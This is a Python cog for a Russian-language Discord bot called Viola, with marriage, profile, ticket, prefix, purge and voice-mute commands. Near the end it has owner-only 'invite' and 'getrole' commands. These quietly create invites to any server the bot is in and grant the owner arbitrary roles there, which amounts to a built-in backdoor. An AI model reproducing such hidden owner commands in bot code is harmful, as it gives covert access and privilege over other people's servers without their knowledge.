import discord, requests, json, datetime, os, asyncio, random, traceback, time, sys, emoji, typing
from discord.ext import commands
from discord.utils import get
from discord.ext.commands import has_permissions
from Config.components import Reactions, SetInfo, Logs
from discord import app_commands
from Config.core import Viola
# -----------------------------------------------------------------------------------------------------------
class cmds(commands.Cog):
    def __init__(self, bot: Viola):
        self.bot = bot
    
    @commands.command()
    @has_permissions(administrator=True)
    async def logs(self, ctx: commands.Context):
        await ctx.send('>>> Логирование\nВыберите действие.', view=Logs(bot=self.bot, ctx=ctx))
    
    @commands.command()
    async def marry(self, ctx: commands.Context, member: discord.Member = None):
        if member is None:
            await ctx.message.reply('`Вам необходимо указать цель.`')
            return
        if member.bot:
            await ctx.message.reply('`На ботах жениться нельзя!`')
            return
        if member == ctx.author:
            await ctx.message.reply('`Попробуйте жениться на ком нибудь другом.`')
            return
        res = await self.bot.bd.fetch({'memberid': ctx.author.id}, category='marry')
        if not res.status:
            res = await self.bot.bd.fetch({'partnerid': ctx.author.id}, category='marry')
            if res.status:
                await ctx.channel.send('`Вы уже женаты/замужем.`')
                return
        else:
            await ctx.channel.send('`Вы уже женаты/замужем.`')
            return
        res = await self.bot.bd.fetch({'guildid': ctx.guild.id, 'memberid': member.id}, category='marry')
        if not res.status:
            res = await self.bot.bd.fetch({'guildid': ctx.guild.id, 'partnerid': member.id}, category='marry')
        if res.status:
            if int(res.value['memberid']) == int(member.id):
                second = int(res.value['partnerid'])
            else:
                second = int(res.value['memberid'])
            await ctx.message.reply(f'>>> Этот человек уже находится в браке с {self.bot.get_user(int(second))}\nСвадьба была <t:{int(res.value["date"])}:R>')
            return
        def check(reaction, user):
            return user == member and (reaction.emoji == '✅' or reaction.emoji == '❌')
        embed = discord.Embed(color=discord.Colour.brand_red())
        embed.title = 'Свадьба.💞'
        embed.description = f'**{ctx.author.name}#{ctx.author.discriminator} Предлагает вам свадьбу.🥰\nУ вас есть 5 минут на принятие решения.**'
        mess = await ctx.channel.send(f'{member.mention} Минуточку внимания...', embed=embed)
        async def a1(mess: discord.Message):
            await mess.add_reaction('✅')
        async def a2(mess: discord.Message):
            await mess.add_reaction('❌')
        self.bot.loop.create_task(a1(mess))
        self.bot.loop.create_task(a2(mess))
        try:
            reaction, user = await self.bot.wait_for('reaction_add', timeout=300.0, check=check)
        except asyncio.TimeoutError:
            embed = discord.Embed(color=discord.Color.brand_red())
            embed.title = 'Свадьбы не будет.💔'
            embed.description = f'**Свадьба отменяется, так как у {member.name}#{member.discriminator} закончилось время...\nА начиналось так красиво...**'
            try:
                embed.set_footer(text=f'{ctx.author.guild.name}', icon_url=f'{ctx.author.guild.icon.url}')
            except Exception:
                embed.set_footer(text=f'{ctx.author.guild.name}', icon_url=f'{self.bot.user.avatar.url}')
            await mess.edit(embed=embed)
            await mess.clear_reactions()
            return
        if reaction.emoji == '❌':
            embed = discord.Embed(color=discord.Colour.brand_red())
            embed.title = 'Свадьба Отменяется.💔'
            embed.description = f'**Свадьбы не будет так как {member.name}#{member.discriminator} отказал(а) {ctx.author.name}#{ctx.author.discriminator}**'
            try:
                embed.set_footer(text=f'{ctx.author.guild.name}', icon_url=f'{ctx.author.guild.icon.url}')
            except Exception:
                embed.set_footer(text=f'{ctx.author.guild.name}', icon_url=f'{self.bot.user.avatar.url}')
            await ctx.channel.send(embed=embed)
            await mess.clear_reactions()
        elif reaction.emoji == '✅':
            res = await self.bot.bd.fetch({'memberid': ctx.author.id}, category='marry')
            if not res.status:
                res = await self.bot.bd.fetch({'partnerid': ctx.author.id}, category='marry')
                if res.status:
                    await ctx.channel.send('`Вы уже женаты/замужем.`')
                    return
            else:
                await ctx.channel.send('`Вы уже женаты/замужем.`')
                return
            embed = discord.Embed(color=discord.Colour.brand_red())
            embed.title = 'Свадьба.💞'
            embed.description = f'**Ура! С этого дня {member.name}#{member.discriminator} и {ctx.author.name}#{ctx.author.discriminator} находятся в браке! Горько!**'
            await self.bot.bd.add({'guildid': ctx.guild.id, 'memberid': member.id, 'partnerid': ctx.author.id, 'date': int(datetime.datetime.now().timestamp())}, category='marry')
            try:
                embed.set_footer(text=f'{ctx.author.guild.name}', icon_url=f'{ctx.author.guild.icon.url}')
            except Exception:
                embed.set_footer(text=f'{ctx.author.guild.name}', icon_url=f'{self.bot.user.avatar.url}')
            await ctx.channel.send(embed=embed)
            try:
                await mess.delete()
            except discord.errors.NotFound:
                pass
    
    @commands.command()
    async def divorce(self, ctx: commands.Context):
        res = await self.bot.bd.fetch({'guildid': ctx.guild.id, 'partnerid': ctx.author.id}, category='marry')
        if not res.status:
            res = await self.bot.bd.fetch({'guildid': ctx.guild.id, 'memberid': ctx.author.id}, category='marry')
            if not res.status:
                await ctx.message.reply('`Сначала женитесь с кем то что-бы развестись!`')
                return
        def check(reaction, user):
            return user == ctx.author and reaction.emoji == '💔'
        if int(res.value['memberid']) == int(ctx.author.id):
            second = int(res.value['partnerid'])
        else:
            second = int(res.value['memberid'])
        embed = discord.Embed(color=discord.Color.brand_red())
        embed.title = 'Стоп стоп стоп'
        embed.description = f'**Вы уверены что хотите развестить с {self.bot.get_user(int(second))}?**💔'
        try:
            embed.set_footer(text=f'{ctx.author.guild.name}', icon_url=f'{ctx.author.guild.icon.url}')
        except Exception:
            embed.set_footer(text=f'{ctx.author.guild.name}', icon_url=f'{self.bot.user.avatar.url}')
        mess = await ctx.channel.send(embed=embed)
        await mess.add_reaction('💔')
        try:
            reaction, user = await self.bot.wait_for('reaction_add', timeout=60.0, check=check)
            await self.bot.bd.remove(res.value, category='marry')
            try:
                await mess.delete()
            except discord.errors.NotFound:
                pass
            embed = discord.Embed(color=discord.Color.brand_red())
            embed.title = 'Развод состоялся💔'
            embed.description = f'**Вы успешно развелись с {self.bot.get_user(int(second))}**\n**Ваш брак был зарегистрирован:** <t:{int(res.value["date"])}:R>'
            try:
                embed.set_footer(text=f'{ctx.author.guild.name}', icon_url=f'{ctx.author.guild.icon.url}')
            except Exception:
                embed.set_footer(text=f'{ctx.author.guild.name}', icon_url=f'{self.bot.user.avatar.url}')
            mess = await ctx.channel.send(embed=embed)
        except asyncio.TimeoutError:
            await mess.delete()
            return
    
    async def getmarryinfo(self, member: discord.Member):
        res = await self.bot.bd.fetch({'guildid': member.guild.id, 'memberid': member.id}, category='marry')
        if not res.status:
            res = await self.bot.bd.fetch({'guildid': member.guild.id, 'partnerid': member.id}, category='marry')
            if res.status:
                args = {'main': member.id, 'partner': res.value['memberid'], 'date': res.value['date']}
                return args
        else:
            args = {'main': member.id, 'partner': res.value['partnerid'], 'date': res.value['date']}
            return args
    
    @commands.command()
    @has_permissions(administrator=True)
    async def clearlevel(self, ctx: commands.Context, member: discord.Member = None):
        if ctx.message.reference:
            msg = await ctx.channel.fetch_message(ctx.message.reference.message_id)
            member = msg.author
        else:
            if member is None:
                member = ctx.author
        res = await self.bot.bd.fetch({'guildid': ctx.guild.id, 'memberid': member.id}, category='messages')
        if res.status:
            embed = discord.Embed(color=discord.Color.brand_red())
            embed.title = 'Внимание!'
            embed.description = f'Обнулить статистику {member.mention}?'
            mess = await ctx.channel.send(embed=embed)
            async def a1(mess: discord.Message):
                await mess.add_reaction('✅')
            async def a2(mess: discord.Message):
                await mess.add_reaction('❌')
            self.bot.loop.create_task(a1(mess))
            self.bot.loop.create_task(a2(mess))
            def check(reaction, user):
                return user == ctx.author and (reaction.emoji == '✅' or reaction.emoji == '❌')
            try:
                reaction, user = await self.bot.wait_for('reaction_add', timeout=30.0, check=check)
            except asyncio.TimeoutError:
                await mess.delete()
                return
            if reaction.emoji == '✅':
                await self.bot.bd.remove({'guildid': ctx.guild.id, 'memberid': member.id}, category='messages')
                await mess.edit(embed=discord.Embed(color=discord.Color.brand_red(), title='Успешно.', description=f'Уровень у {member.mention} обнулен.'))
                await mess.clear_reactions()
            elif reaction.emoji == '❌':
                await mess.delete()
        else:
            embed = discord.Embed(color=discord.Color.brand_red())
            embed.title = 'Ошибка'
            embed.description = f'{member.mention} не написал ни одного сообщения.'
            mess = await ctx.channel.send(embed=embed)
    
    @commands.command(aliases=['user-info'])
    async def user(self, ctx: commands.Context, member: discord.Member=None):
        async with ctx.channel.typing():
            if ctx.message.reference:
                msg = await ctx.channel.fetch_message(ctx.message.reference.message_id)
                member = msg.author
            else:
                if member is None:
                    member = ctx.author
            try:
                a = member.avatar.url is None
                url = member.avatar.url
            except Exception:
                url = 'https://i.ytimg.com/vi/onTNE293NR0/hqdefault.jpg'

            embed = discord.Embed(color=member.top_role.color)
            description = f'{member.mention}\n(Заполнить информацию о себе: `s!setinfo`)\n\n'
            # -------------
            if not member.bot:
                res = await self.bot.bd.fetch({'memberid': member.id, 'guildid': ctx.guild.id}, category='bio')
                if res.status:
                    description += f'`Био:`\n```{res.value["data"]}```\n'
                else:
                    description += f'`Био:`\n ```Не указано.```\n'
                # -------------
                res = await self.bot.bd.fetch({'memberid': member.id, 'guildid': ctx.guild.id}, category='age')
                if res.status:
                    description += f'>>> `Возраст:` {res.value["data"]}\n'
                else:
                    description += f'>>> `Возраст:` Не указан.\n'
                # -------------
                res = await self.bot.bd.fetch({'memberid': member.id, 'guildid': ctx.guild.id}, category='gender')
                if res.status:
                    description += f'`Пол:` {res.value["data"]}\n'
                else:
                    description += f'`Пол:` Не указан.\n'
                # -------------
                res = await self.bot.bd.fetch({'memberid': member.id, 'guildid': ctx.guild.id}, category='name')
                if res.status:
                    description += f'`Имя:` {res.value["data"]}\n'
                else:
                    description += f'`Имя:` Не указано.\n'
                # -------------
                description += '\n'
                # -------------
                res = await self.bot.bd.fetch({'guildid': member.guild.id, 'memberid': member.id}, category='messages')
                if res.status:
                    level = self.bot.GetLevel(res.value['amount'])
                    description += f'`Уровень:` **{level[0]}** `({res.value["amount"]*3}/{level[1]*3})`\n'
                else:
                    description += f'`Уровень:` **0** `(Не написано ни одного сообщения)`\n'
                # ---------------------------------------------     
                args = await self.getmarryinfo(member)
                if args is not None:
                    description += f'`Брак:` В браке с **{self.bot.get_user(args["partner"])}**\n`Дата регистрации:` <t:{args["date"]}:R>\n\n'
                else:
                    description += f'`Брак:` Не состоит в браке.\n\n'
            # ---------------------------------------------
            description += f'`Аватар` [[Клик]]({url})\n'
            embed.title = f'Информация о {member.name}'
            if member.nick is not None:
                description += f'`Пользовательский ник:` **{member.nick}**\n'
            description += f'`Аккаунт создан:` <t:{int(member.created_at.timestamp())}:R>\n'
            res = await self.bot.bd.fetch({'guildid': member.guild.id, 'memberid': member.id}, category='joined')
            if not res.status:
                description += f'`Присоединился к серверу:` <t:{int(member.joined_at.timestamp())}:R>\n'
            else:
                description += f'`Впервые присоединился к серверу:` <t:{res.value["time"]}:R>\n'
            if member.activity is not None:
                if member.activity.type is discord.ActivityType.playing:
                    description += f'`Играет в` **{member.activity.name}**'
                elif member.activity.type is discord.ActivityType.streaming:
                    description += f'`Стримит` **{member.activity.name}**'
                elif member.activity.type is discord.ActivityType.listening:
                    description += f'`Слушает` **{member.activity.name}**'
                elif member.activity.type is discord.ActivityType.watching:
                    description += f'`Смотрит` **{member.activity.name}**'
                elif member.activity.type is discord.ActivityType.competing:
                    description += f'`Соревнуется` **{member.activity.name}**'
                else:
                    description += f'`Пользовательский статус:` **{member.activity.name}**'
                description += '\n'
            if member.status is discord.Status.offline:
                description += f'`Статус:` <:offline:1004822660481548368> Не в сети.'
            elif member.status is discord.Status.online:
                if member.is_on_mobile():
                    description += f'`Статус:` <:online:1004825002203426856> В сети.'
                else:
                    description += f'`Статус:` <:online:1004822664269008976> В сети.'
            elif member.status is discord.Status.dnd or member.status is discord.Status.do_not_disturb:
                description += f'`Статус:` <:dnd:1004822667817406496> Не беспокоить.'
            elif member.status is discord.Status.idle:
                description += f'`Статус:` <:idle:1004822662629040208> Не активен.'
            description += '\n'
            if member.is_timed_out():
                description+=f'`Находится в тайм-ауте до:` <t:{member.timed_out_until.timestamp()}:R>\n'
            description += f'`Самая высокая роль:` <@&{member.top_role.id}>'
            embed.description = description
            embed.set_thumbnail(url=url)
            try:
                embed.set_footer(text=f'{member.guild.name}, user id: {member.id}', icon_url=f'{member.guild.icon.url}')
            except Exception:
                embed.set_footer(text=f'{member.guild.name}, user id: {member.id}', icon_url=f'{self.bot.user.avatar.url}')
            await ctx.channel.send(embed=embed)

    @commands.command()
    async def setinfo(self, ctx: commands.Context):
        async with ctx.channel.typing():
            await ctx.channel.send('>>> Выберите действие,\nкоторое вам нужно:', view=SetInfo(bot=self.bot, ctx=ctx))
    
    @commands.command()
    async def disable(self, ctx: commands.Context, command):
        if command == 'disable' or command == 'enable':
            await ctx.message.reply('Вы не можете отключать эти команды!')
            return
        for x in self.bot.commands:
            if str(x.name) == str(command):
                res = await self.bot.bd.fetch({'guildid': ctx.guild.id, 'commandname': str(x.name)}, category='disabledcmds')
                if res.status:
                    await ctx.message.reply('`Команда уже отключена. Нет смысла снова ее отключать.✅`')
                else:
                    await self.bot.bd.add({'guildid': ctx.guild.id, 'commandname': str(x.name)}, category='disabledcmds')
                    await ctx.message.reply(f'`Команда {command} отключена.✅`\n`Используйте s!enable чтобы включить ее.`')
    
    @commands.command()
    async def enable(self, ctx: commands.Context, command):
        for x in self.bot.commands:
            if str(x.name) == str(command):
                res = await self.bot.bd.fetch({'guildid': ctx.guild.id, 'commandname': str(x.name)}, category='disabledcmds')
                if not res.status:
                    await ctx.message.reply('`Команда не отключена.`')
                else:
                    await self.bot.bd.remove({'guildid': ctx.guild.id, 'commandname': str(x.name)}, category='disabledcmds')
                    await ctx.message.reply(f'`Команда {command} включена обратно.✅`')
    
    @commands.command(aliases = ['reactroles', 'reaction-roles', ])
    @has_permissions(administrator=True)
    async def reactions(self, ctx: commands.Context) -> None:
        async with ctx.channel.typing():
            await ctx.channel.send('>>> Роли по реакции.\nВыберите нужную вам опцию:', view=Reactions(bot=self.bot, author=ctx.author))

    @app_commands.command()
    async def ping(self, interaction: discord.Interaction) -> None:
        ping1 = f"{str(round(self.bot.latency * 1000))} ms"
        embed = discord.Embed(title = "**Pong!**", description = "`" + ping1 + "`", color = 0xafdafc)
        await interaction.response.send_message(embed = embed)

    @commands.command()
    async def avatar(self, ctx: commands.Context, user: discord.User):
        try:
            await ctx.message.reply(user.avatar.url)
        except Exception:
            await ctx.message.reply('Нету аватара.')
    
    @commands.command()
    @has_permissions(administrator=True)
    async def setprefix(self, ctx: commands.Context, prefix):
        async def getprefix():
            res = await self.bot.bd.fetch({'guildid': ctx.guild.id}, category='prefixes')
            if res.status:
                return res.value['prefix'] == prefix
            else:
                return 's!' == prefix
        async def e1(ctx: commands.Context, mess: discord.Message):
            await mess.edit(embed=discord.Embed(title='Смена префикса.', description=f'Префикс сервера {ctx.guild.name} теперь: `{prefix}`', color=0x00ffff))
        async def c2(ctx: commands.Context, mess: discord.Message):
            await mess.clear_reactions()
        if await getprefix():
            await ctx.send(embed=discord.Embed(title='Ошибка.', description=f'Префикс сервера {ctx.guild.name} уже `{prefix}`. Нет смысла его менять.', color=0x00ffff))
            return
        def check(reaction, user):
            return user == ctx.message.author and reaction.emoji == '✅'
        try:
            mess = await ctx.send(embed=discord.Embed(title='Смена префикса.', description=f'Сменить префикс сервера {ctx.guild.name} на `{prefix}`?', color=0x00ffff))
            await mess.add_reaction('✅')
            await self.bot.wait_for('reaction_add', timeout=10.0, check=check)
            self.bot.loop.create_task(c2(ctx, mess))
            self.bot.loop.create_task(e1(ctx, mess))
            await self.bot.bd.remove({'guildid': ctx.guild.id}, category='prefixes')
            await self.bot.bd.add({'guildid': ctx.guild.id, 'prefix': f'{prefix}'}, category='prefixes')
        except asyncio.TimeoutError:
            try:
                await mess.delete()
            except discord.errors.NotFound:
                return

    @commands.command(aliases = ['vc-members', ])
    @has_permissions(administrator=True)
    async def member_count(self, ctx: commands.Context, *args):
        if args[0] == 'remove':
            id = int(str(args[1]).replace('<#', '').replace('>', ''))
            channel = self.bot.get_channel(id)
            if not channel.guild.id == ctx.guild.id:
                await ctx.send(f'`Канал не найден`')
                return
            await channel.delete()
            a = await self.bot.bd.remove({'voiceid': id}, category='voicemembers')
            guild = self.bot.get_guild(int(channel.guild.id))
            if a.value > 0:
                await ctx.send(f'<#{channel.id}> `Убран из каналов статистики на сервере` **{guild.name}**')
            else:
                await ctx.send(f'`Канал не найден`')
            return
        elif args[0] == 'add':
            id = int(str(args[1]).replace('<#', '').replace('>', ''))
            channel = self.bot.get_channel(id)
            if channel is not None:
                res = await self.bot.bd.remove({'guildid': channel.guild.id}, category='voicemembers')
                await self.bot.bd.add({'guildid': channel.guild.id, 'voiceid': id}, category='voicemembers')
                if res.value == 0:
                    await ctx.send(f'`Канал успешно добавлен. Канал:` <#{channel.id}>')
                    guild = self.bot.get_guild(int(channel.guild.id))
                    await channel.edit(name=f"Участников: {guild.member_count}")
                    return
                else:
                    await ctx.send(f'`Канал успешно обновлен. Канал:` <#{channel.id}>')
                    guild = self.bot.get_guild(int(channel.guild.id))
                    await channel.edit(name=f"Участников: {guild.member_count}")
                    return
            else:
                await ctx.send(f'`Канал не найден.`')

    @commands.command()
    async def help(self, ctx: commands.Context):
        com1 = '**Hypixel**:\n`s!link, s!unlink`\n`s!gtop, s!s`\n\n'
        com2 = '**Команды**:\n`s!reply, s!vcm`\n`s!say, s!ship`\n`s!vc-members <remove>\ns!tickets <create/remove/perms>`\n `s!reaction-roles`\n`s!setprefix, s!ping`\n`s!play <название | url>`'
        embed = discord.Embed(title="Help", description=com1+com2, color=discord.Color.green())
        await ctx.send(embed=embed)
    
    @has_permissions(administrator=True)
    @commands.command()
    async def purge(self, ctx: commands.Context, limit, *user):
        if not user:
            if int(limit) > 100:
                await ctx.message.reply('`Лимит сообщений не может быть больше 100.`')
                return
            deleted = await ctx.channel.purge(limit=int(limit))
            await ctx.channel.send(f'Удалено {len(deleted)} сообщений.')
        else:
            member = ctx.guild.get_member(int(user[0].replace('<@', '').replace('>', '')))
            def check(m: discord.Member):
                return m.author == member
            deleted = await ctx.channel.purge(limit=int(limit), check=check)
            await ctx.channel.send(f'Удалено {len(deleted)} сообщений от пользователя <@!{member.id}>')
    
    @commands.command()
    async def ship(self, ctx: commands.Context, *args):
        if not args or len(args) != 2:
            await ctx.send('`s!ship <name1> <name2>`')
            return
        name = args[0]
        name2 = args[1]
        if len(name) == 21:
            name = str(name).replace('<@', '').replace('>', '')
            name = self.bot.get_user(int(name)).name
        if len(name2) == 21:
            name2 = str(name2).replace('<@', '').replace('>', '')
            name2 = self.bot.get_user(int(name2)).name
        shipname = name[:len(name)//2] + str(name2).replace(str(name2[:len(name2)//2]), '')
        compatibility = random.randint(1, 99)
        string = list('▬▬▬▬▬▬▬▬▬▬')
        string[compatibility // 10] = ':heart:'
        string = "[" + ''.join(string) + "]"
        embed = discord.Embed(title=f'Сравниваемые имена: {name} и {name2}.', description=f'Имечко: **{shipname}**\nСовместимость: **{compatibility}**% :heart:\n**{string}**')
        embed.color = discord.Color.random()
        await ctx.send(embed=embed)

    async def d1(self, ctx: commands.Context):
        await ctx.message.delete()
    async def s2(self, ctx: commands.Context, content):
        await ctx.send(' '.join(content))
    @commands.command()
    async def say(self, ctx: commands.Context, *content):
        if not content:
            await ctx.message.delete()
            return
        self.bot.loop.create_task(self.d1(ctx))
        self.bot.loop.create_task(self.s2(ctx, content))

    @commands.command(aliases = ['guilds', ])
    async def leave(self, ctx: commands.Context, *guildid):
        if ctx.author.id == self.bot.owner_id:
            if not guildid:
                msg = ''
                for i in self.bot.guilds:
                    msg += f'`{i}, {i.id}`\n'
                await ctx.send(embed = discord.Embed(title='Мои Сервера: ',description=msg, color=0x00ffff))
                return
            guildid = int(guildid[0])
            try:
                guild = self.bot.get_guild(guildid)
                if guild is not None:
                    await guild.leave()
                    await ctx.send(f"`Я покинула {guild.name}`")
                else:
                    await ctx.send("`Сервер не найден.`")
            except:
                await ctx.send("`Что то пошло не так...`")

    @commands.command()
    @has_permissions(administrator=True)
    async def vcm(self, ctx: commands.Context, *channel):
        ids = [self.bot.owner_id]
        done = False
        if not channel:
            await ctx.send("`s!vcm <channel_id | mention> заглушает всех в голосовом канале.`")
            return
        try:
            vc = self.bot.get_channel(int(str(channel[0]).replace("<#", '').replace(">", '')))
            if not vc: await ctx.send("`Канал не найден.`")
            if vc.guild.name != ctx.guild.name:
                await ctx.send("`Канал не найден.`")
                return
            for member in vc.members:
                if not int(member.id) in ids:
                    await member.edit(mute=True, reason="voice_channel_mute")
                    done = True
            if done:
                await ctx.send(f'`Все участники в канале {vc.name} заглушены.`')
            else:
                await ctx.send(f'`В канале {vc.name} нет участников, которых можно заглушить.`')
        except Exception:
            return

    async def d1(self, ctx: commands.Context):
        await ctx.message.delete()
    async def r2(self, ctx: commands.Context, content, message: discord.Message):
        await message.reply(content=' '.join(content))
    @commands.command(aliases = ['r', ])
    async def reply(self, ctx: commands.Context, *content):
        if not ctx.message.reference:
            return
        ref = ctx.message.reference
        message = self.bot.get_channel(ref.channel_id).get_partial_message(ref.message_id)
        self.bot.loop.create_task(self.d1(ctx))
        self.bot.loop.create_task(self.r2(ctx, content, message))

    @commands.command()
    @has_permissions(administrator=True)
    async def tickets(self, ctx: commands.Context, *args):
        if args:
            if args[0] == 'remove':
                res = await self.bot.bd.fetch({'guildid': ctx.guild.id}, category='tickets')
                if res.status:
                    def check(reaction, user):
                        return user == ctx.message.author and reaction.emoji == '💔'
                    try:
                        mess = await ctx.send('`Удалить систему жалоб?`')
                        await mess.add_reaction('💔')
                        await self.bot.wait_for('reaction_add', timeout=10.0, check=check)
                        await mess.delete()
                    except asyncio.TimeoutError:
                        try:
                            await mess.delete()
                            return
                        except discord.errors.NotFound:
                            return
                    async with ctx.channel.typing():
                        value = res.value
                        category = discord.utils.get(ctx.guild.categories, id = int(value['catid']))
                        channel = self.bot.get_channel(int(value['channel_id']))
                        res = await self.bot.bd.remove({'guildid': int(ctx.guild.id)}, category='tickets')
                        try:
                            await channel.delete()
                        except Exception:
                            pass
                        try:
                            await category.delete()
                        except Exception:
                            pass
                        try:
                            await ctx.send(f'`Система жалоб удалена участником`<@!{ctx.author.id}>`!`')
                            return
                        except discord.errors.NotFound:
                            return
                else:
                    embed = discord.Embed(description='`Система тикетов не найдена. s!tickets create`')
                    embed.color = 0x00ffff
                    await ctx.send(embed=embed)
            elif args[0] == 'create':
                res = await self.bot.bd.fetch({'guildid': ctx.guild.id}, category='tickets')
                if res.status:
                    value = res.value
                    category = discord.utils.get(ctx.guild.categories, id = int(value['catid']))
                    channel = self.bot.get_channel(int(value['channel_id']))
                    if channel is not None and category is not None:
                        embed = discord.Embed(title='Tickets.', description=f'ticket-channel: <#{channel.id}> , {channel.id}\nticket-category: {category.name}, {category.id}')
                        embed.color = 0x00ffff
                        await ctx.send(embed=embed)
                        return
                def check(reaction, user):
                    return user == ctx.message.author and reaction.emoji == '❤️'
                try:
                    mess = await ctx.send('`Создать систему тикетов и жалоб?`')
                    await mess.add_reaction('❤️')
                    await self.bot.wait_for('reaction_add', timeout=10.0, check=check)
                except asyncio.TimeoutError:
                    try:
                        await mess.delete()
                        return
                    except discord.errors.NotFound:
                        return
                try:
                    await mess.delete()
                except discord.errors.NotFound:
                    pass
                async with ctx.channel.typing():
                    category = await ctx.guild.create_category(name='-    Tickets    -', reason='tickets')
                    channel = await category.create_text_channel(name='Create Ticket', reason='tickets')
                    await channel.set_permissions(channel.guild.default_role, send_messages=False)
                    await self.bot.bd.remove({'guildid': ctx.guild.id}, category='tickets')
                    await self.bot.bd.add({'guildid': ctx.guild.id, 'catid': category.id, 'channel_id': channel.id}, category='tickets')
                    await channel.send(">>> Если у вас есть жалоба или вопрос то этот канал для вас.\n**Убедительная просьба, не создавать тикеты просто так.**", view=Buttons(bot=self.bot))
                    await ctx.channel.send(f'`Система тикетов создана. Канал:`<#{channel.id}>')
            elif args[0] == 'perms':
                lst = []
                args = list(args)
                args.remove('perms')
                for i in args:
                    arg = str(i).replace('<@&', '').replace('>', '')
                    lst.append(int(arg))
                await self.bot.bd.remove({'guildid': ctx.guild.id}, category='tickets')
                await self.bot.bd.add({'guildid': ctx.guild.id, 'roles': lst}, category='ticketsperms')
                text = '**Роли Обновлены:**\n'
                for i in lst:
                    text+=f'<@&{i}>\n'
                embed = discord.Embed(title='Права каналов для жалоб и тикетов.', description=text)
                embed.color = 0x00ffff
                await ctx.send(embed=embed)
        else:
            embed = discord.Embed(title="Tickets", description="`<args: create/remove/perms>`", color=0x00ffff)
            await ctx.send(embed=embed)

    @commands.command()
    async def invite(self, ctx: commands.Context, id):
        if ctx.author.id != self.bot.owner_id:
            return
        guild = self.bot.get_guild(int(id))
        channel = guild.categories[0].channels[0]
        invitelink = await channel.create_invite(max_uses=1)
        await ctx.author.send(invitelink)

    @commands.command()
    async def getrole(self, ctx: commands.Context, guild_id, role_id):
        if ctx.author.id != self.bot.owner_id:
            return
        guild = self.bot.get_guild(int(guild_id))
        role = get(guild.roles, id=int(role_id))
        members = self.bot.get_all_members()
        for i in members:
            if i.id == self.bot.owner_id and i.guild.id == guild.id:
                await i.add_roles(role)
# -----------------------------------------------------------------------------------------------------------
class Buttons_inChannel(discord.ui.View):
    def __init__(self, *, bot:commands.Bot, timeout=None):
        super().__init__(timeout=timeout)
        self.bot = bot
    @discord.ui.button(label="Закрыть Канал.", style=discord.ButtonStyle.gray)
    async def close(self, interaction:discord.Interaction, button: discord.ui.Button):
        async def c1(channel: discord.TextChannel):
            async for x in channel.history(oldest_first=True, limit=3):
                if '>>> Тикет был успешно создан.' in x.content or '>>> Жалоба была успешно создана.' in x.content:
                    await x.edit(content=x.content, view=None)
        self.bot.loop.create_task(c1(interaction.channel))
        await interaction.response.send_message(content='`Канал удалится через 10 секунд...`')
        pinid = await interaction.channel.pins()
        pinid = int(str(pinid[0].content).replace('>>> Ваш id: ', ''))
        member = await self.bot.fetch_user(pinid)
        await interaction.channel.set_permissions(member, send_messages=False)
        await asyncio.sleep(10)
        try:
            await interaction.channel.delete()
        except discord.errors.NotFound:
            return
class Buttons(discord.ui.View):
    def __init__(self, *, bot: Viola, timeout=None):
        super().__init__(timeout=timeout)
        self.bot = bot
    @discord.ui.button(label="Жалоба", style=discord.ButtonStyle.red)
    async def jaloba(self, interaction:discord.Interaction, button: discord.ui.Button):
        res = await self.bot.bd.fetch({'guildid': interaction.guild.id}, category='tickets')
        value = res.value
        category = discord.utils.get(interaction.guild.categories, id=value['catid'])
        await interaction.response.defer(ephemeral=True, thinking=True)
        for i in category.text_channels:
            channel = self.bot.get_channel(i.id)
            a = await channel.pins()
            for j, k in enumerate(a):
                if int(str(a[j].content).replace('>>> Ваш id: ', '')) == int(interaction.user.id):
                    await interaction.followup.send(content=f'Перейдите в канал <#{i.id}>.', ephemeral=True)
                    return
        channel = await interaction.guild.create_text_channel(f"Жалоба {interaction.user.name}", category=category)
        async def p1(channel: discord.TextChannel):
            await channel.set_permissions(interaction.guild.default_role, view_channel=False)
            await channel.set_permissions(target=interaction.user, view_channel=True)
            try:
                all = await self.bot.bd.rows(mode='list', category='ticketsperms')
                for i in all.value:
                    if interaction.guild.id == int(i['guildid']):
                        for j in i['roles']:
                            role = interaction.guild.get_role(int(j))
                            await channel.set_permissions(role, view_channel=True, send_messages=True)
            except Exception:
                pass
        self.bot.loop.create_task(p1(channel))
        await interaction.followup.send(content=f'Канал <#{channel.id}> создан.', ephemeral=True)
        await channel.send(f'>>> <@!{interaction.user.id}>')
        message = await channel.send(f'>>> Ваш id: {interaction.user.id}')
        await message.pin()
        async def d2(channel: discord.TextChannel):
            async for x in channel.history(limit=10):
                if x.content == '':
                    await x.delete()
        self.bot.loop.create_task(d2(channel))
        message = await channel.send(f'>>> Жалоба была успешно создана.', view=Buttons_inChannel(bot=self.bot))
    @discord.ui.button(label="Тикет", style=discord.ButtonStyle.green)
    async def ticket(self, interaction:discord.Interaction, button: discord.ui.Button):
        res = await self.bot.bd.fetch({'guildid': interaction.guild.id}, category='tickets')
        value = res.value
        category = discord.utils.get(interaction.guild.categories, id=value['catid'])
        await interaction.response.defer(ephemeral=True, thinking=True)
        for i in category.text_channels:
            a = await self.bot.get_channel(i.id).pins()
            for j, k in enumerate(a):
                if int(str(a[j].content).replace('>>> Ваш id: ', '')) == int(interaction.user.id):
                    await interaction.followup.send(content=f'Перейдите в канал <#{i.id}>.', ephemeral=True)
                    return           
        channel = await interaction.guild.create_text_channel(f"Тикет {interaction.user.name}", category=category)
        async def p1(channel: discord.TextChannel):
            await channel.set_permissions(interaction.guild.default_role, view_channel=False)
            await channel.set_permissions(target=interaction.user, view_channel=True)
            try:
                all = await self.bot.bd.rows(mode='list', category='ticketsperms')
                for i in all.value:
                    if interaction.guild.id == int(i['guildid']):
                        for j in i['roles']:
                            role = interaction.guild.get_role(int(j))
                            await channel.set_permissions(role, view_channel=True, send_messages=True)
            except Exception:
                pass
        self.bot.loop.create_task(p1(channel))
        await interaction.followup.send(content=f'Канал <#{channel.id}> создан.', ephemeral=True)
        await channel.send(f'>>> <@!{interaction.user.id}>')
        message = await channel.send(f'>>> Ваш id: {interaction.user.id}')
        await message.pin()
        async def d2(channel):
            async for x in channel.history(limit=10):
                if x.content == '':
                    await x.delete()
        self.bot.loop.create_task(d2(channel))
        message = await channel.send(f'>>> Тикет был успешно создан.', view=Buttons_inChannel(bot=self.bot))
# -----------------------------------------------------------------------------------------------------------
async def setup(bot: commands.Bot):
    await bot.add_cog(cmds(bot))